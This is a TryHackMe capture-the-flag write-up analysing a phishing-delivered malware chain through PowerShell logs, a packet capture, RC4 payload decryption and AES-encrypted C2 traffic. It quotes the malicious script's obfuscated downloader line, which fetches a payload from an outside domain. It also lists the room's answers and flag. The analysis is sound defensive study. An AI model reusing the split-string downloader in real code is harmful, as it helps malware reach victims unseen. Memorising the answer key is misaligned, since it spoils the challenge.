# TryHackMe: Masquerade

**Category:** Malware Analysis / Static Forensics
**Tooling:** python-evtx, Wireshark, VirusTotal
**Techniques:** PowerShell log parsing, string obfuscation deobfuscation, RC4 decryption analysis, network payload extraction, custom AES C2 protocol decryption

---

## Overview

A phishing email disguised as a system administrator's request tricks Jim in Finance into running a "critical security update" script. The provided artifacts (containing real malware, analyzed statically only, no execution) are used to trace the full infection chain: an obfuscated PowerShell downloader, an RC4-encrypted second-stage payload, and a custom AES-based C2 protocol used to issue commands to the compromised host.

**Note:** Analysis was conducted entirely via static inspection in a controlled lab (WSL/VM) environment — no malware was executed.

---

## 1. Setup

Extracted the provided artifact archive (`attachments-1775848377405.zip`) inside a WSL-based analysis environment.

---

## 2. Investigation

### Q1 — External domain contacted during script execution

Parsed the PowerShell-Operational EVTX log using a custom Python script built on **python-evtx**:

```python
from Evtx.Evtx import Evtx
import xml.etree.ElementTree as ET

evtx_file = "/home/kali/WriteUps/THM/Masquerade/Powershell-Operational.evtx"
ns = {'e': 'http://schemas.microsoft.com/win/2004/08/events/event'}

with Evtx(evtx_file) as log:
    for record in log.records():
        xml_data = record.xml()
        root = ET.fromstring(xml_data)
        event_id = root.find(".//e:EventID", ns)
        time_created = root.find(".//e:TimeCreated", ns)
        print("EventID:", event_id.text if event_id is not None else None)
        print("Time:", time_created.attrib.get("SystemTime") if time_created is not None else None)
        print(xml_data)
```

This surfaced the malicious PowerShell script, which builds its target domain from split string fragments to evade static string detection:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
```

Reassembling the fragments (removing commas/quotes from the `-join` call) reveals the domain.

**Answer:**
```
api-edgecloud.xyz
```

---

### Q2 — Encryption algorithm used by the script

The decryption loop in the script (key-scheduling algorithm + XOR-based byte mixing) matches the classic **RC4** structure.

**Answer:**
```
RC4
```

---

### Q3 — Key used to decrypt the second-stage payload

Extracted from the `$k` byte array construction in the script.

**Answer:**
```
X9vT3pL2QwE8xR6ZkYhC4s
```

---

### Q4 — Timestamp of the server response containing the payload

Opened the provided PCAP in **Wireshark** and followed the relevant TCP stream (packet 1665) to inspect the HTTP response headers.

**Answer:**
```
Fri, 10 Apr 2026 05:28:23 GMT
```

---

### Q5 — SHA-256 hash of the extracted and decrypted payload

Decrypted the payload per the RC4 routine above, then submitted the resulting binary's hash to **VirusTotal** for confirmation.

**Answer:**
```
e3d39d42df63c6874780737244370ba517820f598fd2443e47ff6580f10c17cb
```

---

### Q6 — Remote URL used for C2 communication with the victim machine

**Answer:**
```
http://34.174.57.99
```

---

### Q7 — Encryption key and algorithm used by the client for C2 traffic

**Answer (format: key, algorithm):**
```
M4squ3r4d3Th3P4ck3tSt34lthM0d31337, AES
```

---

### Q8 — Flag from decrypting the attacker's executed commands

Decoded the Base64-encoded data field from the C2 traffic:
```
c09Gc3pZOGRaOGF6MWo4bUNKM0tGUktFK2t2b3dOOEtQR2hhWUF0VVlhcUdwWjl4RGJHNXR1UnkyRzdOTXptdQ==
```

Correlated this with the `magic_hostname=DESKTOP-I6C5C7M` field found alongside a GUID value, then decrypted using the AES key/algorithm identified in Q7.

**Answer:**
```
THM{m45k3d_tr4ff1c_0v3r_c0v3rt_ch4nn3lz}
```

---

## Key Lesson

This room is a strong example of layered malware obfuscation: the delivery script splits its own C2 domain into string fragments purely to defeat naive static string-scanning, then wraps its second-stage payload in RC4 encryption keyed directly in the script itself (a common weak point — the key is always recoverable once you have the dropper). The C2 channel adds a further AES layer on top of standard HTTP, meaning full command reconstruction required chaining together PowerShell log analysis, PCAP inspection, and two separate decryption routines (RC4 for the payload, AES for the C2 commands) rather than any single tool solving the case in isolation.
